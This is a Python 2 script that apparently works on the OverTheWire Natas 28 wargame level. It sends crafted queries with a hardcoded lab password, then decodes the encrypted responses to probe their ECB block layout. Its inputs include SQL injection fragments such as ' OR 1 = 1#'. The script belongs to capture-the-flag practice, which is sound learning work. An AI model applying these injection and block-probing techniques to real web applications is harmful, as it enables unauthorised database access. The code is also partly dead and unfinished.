import requests
import string
import urllib
import sys
import base64


[name, test] = sys.argv

print test


target = 'http://natas28.natas.labs.overthewire.org/index.php'

user_auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
tar = string.ascii_letters + string.digits

# test post data on local netcat: nc -lvp 8888
if test == '1' :
    target = 'http://localhost:8888'
    user_auth = ()
    tar = ['%00']


# test selected stingers
elif test == '2' :
    #tar = ['0', '%00']
    temp = '%{0}'
    tar = [""]
    for i in range(0, 100):
        tar.append(temp.format(str(i).zfill(2)))

# input increasingly longer length of %00
elif test == '3' :
    temp = '%{0}'
    tar = []
    for i in range(12, 100, 16):
        tar.append(temp.format("65") * i)

# custom input
elif test == '4' :
    #tar = ["padpadpadp" + "b" * 15, "padpadpadp" + "b" * 16, "padpadpadp" + "b" * 3 + "%0d" * 6]
    tar = ["padpadpadp", " OR 1 = 1#", "padpadpadpadpSELECT text FROM"]

def decodeNatas ( encodedStr ) :
    R = ['97', '3f', 'd7', '04', 'd2', 'b4', 'a1', 'af', '7a', '52', '98', '38', 'fd', '51', '8c', 'f9']
    decodedArr = []
    for i in range(0, len(encodedStr)):
        decodedArr.append(chr(ord(encodedStr[i]) ^ int(R[i % 16], 16)))
    return "".join(decodedArr)





# notes
# 42 bytes IV?
# 22 bytes blocks
# 44 bytes padding   
# going beyond target length [0, 6], 22 bytes are added to IV
# another 1st block length increase after [7, 14]

# going beyond target length [0, 8], 20 bytes are added in total length
# seems like every 8 length, total length increases. this time by 24 bytes
# seems to alternate between 20 and 24 bytes addition
header = {'Content-Type': 'application/x-www-form-urlencoded'}

laststr = ''
for i in range(0, len(tar)):

    
    #payload = {'query':'tar[i]'}
    payload = 'query=%s' % tar[i]
    #print payload
    #response = requests.post(target, auth = user_auth, data = payload, allow_redirects = True)
    response = requests.post(target, auth = user_auth, headers = header, data = payload, allow_redirects = True)
    #print(response.text)
    #for rehist in response.history:
#print rehist.status_code, rehist.url
    query = str.split(response.url.encode('ascii','ignore'), '=')
    print response.url
    #print(query)
    #print(tar[i].ljust(3)),
    currstr = base64.b64decode(urllib.unquote(query[1]))
    #print '-'*60 
    #print(decodeNatas(currstr))
    #print(urllib.unquote(tar[i]))
    #print '-'* 60
    

    #print(len((base64.b64decode(urllib.unquote(query[1])))))
    
    




    # compare the strings
    if 1 == 0:
        for index, bitchar in enumerate(laststr):
            if bitchar == currstr[index]:
                sys.stdout.write('_')
            else:
                sys.stdout.write('*')
        sys.stdout.flush()
        print " ",
        laststr = base64.b64decode(urllib.unquote(query[1]))
    
    # print out the blocks for comparison
    if 1 == 1:
        for block in range(0, len(currstr),16):
            print "".join([format(ord(x), 'x').zfill(2) for x in currstr[block:block+16]])
            if block == 64 and 1 == 0:
                crackR = [chr(ord(x) ^ ord("e")) for x in currstr[block:block+16]]
                print "\n" + "Decrypt" + "\n" + "-" * 60
                if len(currstr) > 100 :
                    for chars2 in range(0, len(currstr)):
                        
                        sys.stdout.write(chr(ord(currstr[chars2]) ^ ord(crackR[chars2 % 16])))
                        if chars2 % 16 == 0:
                            sys.stdout.write("\n")
                        sys.stdout.flush()
                    print "\n" + "-" * 70
                    print crackR
                    break
        print '-' * 60


    
    #print(urllib.unquote(query[1])),
    #print(urllib.unquote(tar[i]).rjust(2))
